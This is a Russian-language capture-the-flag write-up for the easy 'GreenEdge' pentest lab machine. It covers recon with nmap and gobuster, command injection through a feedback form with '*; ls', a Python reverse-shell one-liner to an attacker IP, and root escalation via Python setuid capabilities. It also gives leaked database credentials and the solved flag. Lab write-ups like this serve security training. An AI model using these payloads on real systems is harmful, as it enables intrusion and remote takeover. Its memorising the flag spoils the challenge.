# Отчет по задаче: GreenEdge

**Категория:** Pentest Machines
**Сложность:** Легкая
**Ссылка на задачу:** [Ссылка](https://hackerlab.pro/en/categories/pentest-machines/6b4ece6f-b8e0-43c0-84c7-250cd540bea3)  
**Дата решения:** 23-24 октября 2025 
**Заметки**: [[notes]]
**Найденная информация**: [[loot]]

---

## Описание задачи

GreenEdge недавно развернула обновлённую версию своего внутреннего портала. Система предназначена для облегчения коммуникации между отделами и улучшения рабочих процессов. Некоторые пользователи сообщили о нестабильной работе отдельных компонентов. Инфраструктура уже доступна для анализа.

## Исходные данные

- **Целевой хост**: 192.168.2.219 (через VPN)
- **Цель:** Найти флаг в формате CODEBY{...}

## Разведка (Reconnaissance)

Начал со сканирования сети и анализа веб-приложения:

*   **Инструменты:** `nmap`, `gobuster`
*   **Найденная информация:** 
	* Веб-портал на порту 80 со страницами: `index.php`, `about.php`, `contact.php`, `feedback.php`
	* Форма обратной связи - единственный интерактивный элемент
	* Обнаружен файл `config.php` (возвращает пустой HTML)
	* Директория `assets/` содержит только статические файлы

**Nmap сканирование:**

```bash
nmap -sS -Pn -v -oN general_tcp_ports_scan_nmap 192.168.2.219  # Первоначальное сканирование сети. Вывод в файле `general_tcp_ports_scan`
nmap -Pn -sV -p 80,22 -oN ports_versions_scan 192.168.2.219                     # Сканирование версий портов. Вывод в файле `ports_versions_scan`
```

**Gobuster сканирование**:

```bash
gobuster dir -u http://192.168.2.219 -w dns-small.txt -x php,txt,html -o dir_scan_gobuster # Сканирование директорий и php/txt/html-файлов. Вывод в файле `dir_scan_gobuster`
```

## Анализ уязвимостей (Vulnerability Analysis)

*   **Найденная уязвимость:** Выполнение произвольных команд (RCE) через форму обратной связи
*   **Логика поиска:** 
	* Протестировал XSS - защищено
	* Попробовал SQL-инъекции - нестандартное поведение
	* Обнаружил, что при вводе `SELECT * FROM users` вместо `*` выводится содержимое текущей директории
	* Нашел синтаксис `*; [comand]` для выполнения команд

## Эксплуатация (Exploitation)

*   **Шаг 1:** Подтверждение RCE через выполнение команды `*; ls`
*   **Шаг 2:** Получение reverse shell для удобного доступа
*   **Шаг 3**: Стабилизация оболочки и анализ системы
*   **Шаг 4**: Эскалация привилегий через capabilities Python
*   **Шаг 5**: Поиск и сбор флага из 2-х частей

**Код/Команда:**
```bash
# Reverse Shell
*; export RHOST="192.168.124.79";export RPORT=9901;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

# Privilege Escalation
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Поиск флага
find / -name "*part*" 2>/dev/null
```

**Дополнительная находка**:

Обнаружен файл `/var/www/html/config.php` с учетными данными БД:

```php
<?php 
$DB_HOST = 'localhost';
$DB_USER = 'root';
$DB_PASS = 'SuperSecret123';
$DB_NAME = 'internal_data';
?>
```

## Решение

**Флаг:** `CODEBY{FR0M_F33DB4CK_70_R007_1337}`
- **Первая часть**: `/home/charley/first_part` - `CODEBY{FR0M_F33DB4CK`
- **Вторая часть**: `/root/last_part` - `_70_R007_1337}`

## Заключение

Задача демонстрирует классические ошибки безопасности: неправильная санитизация пользовательского ввода привела к RCE, а небезопасная конфигурация системы привела к эскалации привилегий.

**Что узнал**:

- Новый синтаксис для тестирования RCE: `*; ls`
- Reverse Shell Generator Online - [ссылка](https://www.revshells.com/)

---
**Полезные ссылки:**
*   [Reverse Shell Generator](https://www.revshells.com/)
* [Linux Privileges Escalation Checklist](https://viperone.gitbook.io/pentest-everything/everything/everything-linux/privilege-escalation-checklist)
* [GTFOBins - Capabilities](https://gtfobins.github.io/#+capabilities)